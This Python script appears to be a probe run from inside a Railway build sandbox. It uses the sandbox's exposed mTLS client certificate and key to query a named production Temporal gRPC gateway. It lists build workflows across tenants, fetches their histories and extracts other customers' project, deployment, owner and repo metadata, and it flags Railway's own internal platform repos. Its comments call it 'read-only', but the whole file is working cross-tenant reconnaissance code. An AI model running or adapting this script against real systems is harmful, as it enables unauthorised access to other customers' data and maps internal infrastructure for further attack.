#!/usr/bin/env python3
# I67940: builds-namespace breadth read (metadata only) to locate Railway-owned build contexts.
# Read-only: ListWorkflowExecutions + GetWorkflowExecutionHistory only.
# Runs INSIDE a Railway build sandbox that has /pki/{client.crt,client.key,server-ca-bundle.crt}
import subprocess, struct, json, sys, os, time, re

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
MARK = os.environ.get('MARK', 'I67940')
CTR = [0]
T0 = time.time()


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def grpc_call(path, body=b'', timeout=15, method='POST'):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    tu = '/tmp/t%d.txt' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '4', '-m', str(timeout), '-D', hu, '-o', bu,
            '--trace-ascii', tu, '-w', '%{http_code}',
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', method, G + path,
            '-H', 'te: trailers']
    if method == 'POST':
        args += ['-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    p = subprocess.run(args, capture_output=True, text=True)
    hdr = ''
    for f in (hu, tu):
        try:
            hdr += open(f, 'rb').read().decode('utf-8', 'replace')
        except Exception:
            pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'http': p.stdout.strip(), 'st': (sts[-1] if sts else '-'), 'data': data,
            'err': (p.stderr or '').strip()[:120]}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def out(s):
    print(s, flush=True)


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b, lim=8):
    o = []
    i = 0
    while len(o) < lim:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try:
                o.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
    return o


TAIL = {
    'owner': ('github.owner', 'git_repo_owner', 'repoowner', 'repo_owner', 'owner'),
    'repo': ('github.repo', 'git_repo_name', 'reponame', 'repo_name', 'repository', 'repo'),
    'ref': ('github.ref', 'git_commit_sha', 'commit_sha'),
}
FLAGS = ('rootdirectory', 'dockerfilepath', 'builddriver', 'targetregion', 'buildermode',
         'projectid', 'serviceid', 'environmentid', 'deploymentid', 'region', 'builder')


def meta_from_json(j, d):
    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                p = (path + '.' + k) if path else k
                kl = p.lower()
                if isinstance(v, str):
                    for name, tails in TAIL.items():
                        if name not in d and any(kl.endswith(t) for t in tails):
                            # only accept owner/repo from git/repo/objectmetadata-ish paths
                            if name in ('owner', 'repo'):
                                if not any(x in kl for x in ('git', 'repo', 'github', 'metadata')):
                                    continue
                            d[name] = v[:120]
                            break
                    for fl in FLAGS:
                        if fl not in d and kl.endswith(fl):
                            d[fl] = v[:120]
                elif isinstance(v, (dict, list)):
                    walk(v, p)
        elif isinstance(o, list):
            for it in o[:4]:
                walk(it, path)
    walk(j, '')


def extract(pl):
    d = {}
    for j in jsons_from(pl):
        meta_from_json(j, d)
        if isinstance(j, dict):
            for k in ('identifiers', 'Identifiers'):
                if isinstance(j.get(k), dict):
                    for kk, vv in j[k].items():
                        if isinstance(vv, str):
                            d.setdefault(k + '.' + kk, vv[:60])
    txt = pl.decode('utf-8', 'replace')
    m = re.search(r'"projectID"\s*:\s*"([^"]{1,80})"', txt)
    if m and 'projectid' not in d:
        d['projectid'] = m.group(1)
    return d


def list_execs(ns, query='', size=20, maxpages=10):
    ex = []
    tok = b''
    pg = 0
    pages = 0
    while pg < maxpages:
        body = fs(1, ns) + fv(2, size) + (fs(4, query) if query else b'') + (fmsg(3, tok) if tok else b'')
        r = grpc_call(T + 'ListWorkflowExecutions', body, timeout=25)
        out('LIST|pg%d|st=%s|http=%s|len=%d|t=%.1f' % (pg, r['st'], r['http'], len(r['data']), time.time() - T0))
        if r['st'] != '0':
            return ex, pg + 1
        pl = frame_payload(r['data'])
        ents = all_of(pl, 1)
        for ei in ents:
            e = get1(ei, 1) or b''
            wid = (get1(e, 1) or b'').decode('utf-8', 'replace')
            rid = (get1(e, 2) or b'').decode('utf-8', 'replace')
            ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
            st = [v for f, w, v in parse(ei) if f == 5 and w == 0]
            if wid:
                ex.append((wid, rid, ty, st[0] if st else -1))
        tok = get1(pl, 2) or b''
        pages = pg + 1
        out('LISTP|pg%d|n=%d|toklen=%d' % (pg, len(ents), len(tok)))
        if not tok or not ents:
            break
        pg += 1
    return ex, pages


T = '/temporal.api.workflowservice.v1.WorkflowService/'
out('===I67940 START %s=== t=%s' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
out('HOST=' + subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
out('CERT=' + subprocess.run(['sh', '-c', 'openssl x509 -in %s -noout -subject 2>&1' % CRT],
                               capture_output=True, text=True).stdout.replace('\n', ' ').strip())

r = grpc_call(T + 'GetSystemInfo', b'', timeout=15)
out('CTRL|GetSystemInfo|st=%s|http=%s|len=%d' % (r['st'], r['http'], len(r['data'])))

# ---- A: breadth list, multiple time windows
execs = []
seen = set()
WINDOWS = ['30d', '7d', 'all']
for w in WINDOWS:
    if w == '30d':
        q = 'ExecutionTime > "%s"' % time.strftime('%Y-%m-%dT00:00:00Z', time.gmtime(time.time() - 30 * 86400))
    elif w == '7d':
        q = 'ExecutionTime > "%s"' % time.strftime('%Y-%m-%dT00:00:00Z', time.gmtime(time.time() - 7 * 86400))
    else:
        q = ''
    out('===A LIST %s q=%s===' % (w, q))
    ex, pages = list_execs('builds', q, 20, 10)
    out('===A RESULT %s pages=%d execs=%d===' % (w, pages, len(ex)))
    for e in ex:
        key = e[1] or e[0]
        if key not in seen:
            seen.add(key)
            execs.append(e)
    if len(execs) >= 150:
        break

types = {}
for e in execs:
    types[e[2]] = types.get(e[2], 0) + 1
out('TYPES|' + ';'.join('%s=%d' % (k, v) for k, v in sorted(types.items(), key=lambda x: -x[1])))
out('EXECS_TOTAL=%d UNIQUE=%d' % (len(execs), len(seen)))
for e in execs[:6]:
    out('  E|%s|%s|st=%s' % (e[2][:36], e[0][:60], e[3]))

# ---- B: histories, metadata only
PRI = ('SnapshotAndBuild', 'ScheduleSnapshotAndBuild', 'ScheduleBuildAndPublishImage', 'BuildAndPublishImage', 'Build')
def prio(t):
    for i, p in enumerate(PRI):
        if p.lower() in t.lower():
            return i
    return len(PRI)
order = sorted(range(len(execs)), key=lambda i: (prio(execs[i][2]), i))
BUDGET = float(os.environ.get('HISTBUDGET', '420'))
MAXH = int(os.environ.get('MAXH', '120'))
owners = {}
repos = {}
done = 0
hits = []
out('===B HISTORIES budget=%ss max=%d===' % (BUDGET, MAXH))
for idx in order:
    if done >= MAXH or (time.time() - T0) > BUDGET:
        break
    wid, rid, ty, st = execs[idx]
    body = fs(1, 'builds') + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20)
    r = grpc_call(T + 'GetWorkflowExecutionHistory', body, timeout=20)
    done += 1
    if r['st'] != '0':
        out('H|st=%s|%s|%s' % (r['st'], ty[:28], wid[-14:]))
        continue
    pl = frame_payload(r['data'])
    d = extract(pl)
    own = d.get('owner', '')
    rep = d.get('repo', '')
    proj = d.get('identifiers.projectID') or d.get('projectid', '')
    svc = d.get('identifiers.serviceID') or d.get('serviceid', '')
    env = d.get('identifiers.environmentID') or d.get('environmentid', '')
    dep = d.get('identifiers.deploymentID') or d.get('deploymentid', '')
    root = d.get('rootdirectory', '') or d.get('dockerfilepath', '')
    drv = d.get('builddriver', '')
    reg = d.get('targetregion', '') or d.get('region', '')
    owner_key = (own or '<none>').lower()
    owners[owner_key] = owners.get(owner_key, 0) + 1
    if rep:
        rk = ((own or '') + '/' + rep).lower()
        repos[rk] = repos.get(rk, 0) + 1
    flagged = owner_key in ('railway', 'railwayapp', 'railwaycorp', 'railway-infra', 'railway_infra') or \
        re.search(r'(?i)(^|[-_/])(orchestrator|backboard|network-?cp|stacklet|builderv3|hikari|station|railyard|cms|siteops|vm-?runner|rrproxy|depot)([-_/]|$)', rep or '')
    tag = 'PLAT' if flagged else 'X'
    out('%s|%s|proj=%s|env=%s|svc=%s|dep=%s|owner=%s|repo=%s|ref=%s|root=%s|drv=%s|reg=%s' % (
        tag, ty[:30], proj[:40], env[:40], svc[:40], dep[:40], own[:40], rep[:60],
        (d.get('ref') or '')[:16], root[:60], drv[:24], reg[:24]))
    if flagged:
        hits.append(d)

out('===C SUMMARY===')
out('DONE_HIST=%d' % done)
out('OWNERS|' + ';'.join('%s=%d' % (k, v) for k, v in sorted(owners.items(), key=lambda x: -x[1])[:40]))
out('REPOS_TOP|' + ';'.join('%s=%d' % (k, v) for k, v in sorted(repos.items(), key=lambda x: -x[1])[:40]))
out('PLAT_HITS=%d' % len(hits))
for d in hits[:20]:
    out('PLATH|proj=%s|owner=%s|repo=%s|root=%s|drv=%s|reg=%s' % (
        (d.get('identifiers.projectID') or d.get('projectid', ''))[:40], d.get('owner', '')[:40],
        d.get('repo', '')[:60], (d.get('rootdirectory') or d.get('dockerfilepath') or '')[:60],
        d.get('builddriver', '')[:24], (d.get('targetregion') or d.get('region', ''))[:24]))
out('===I67940 END t=%.1f===' % (time.time() - T0))
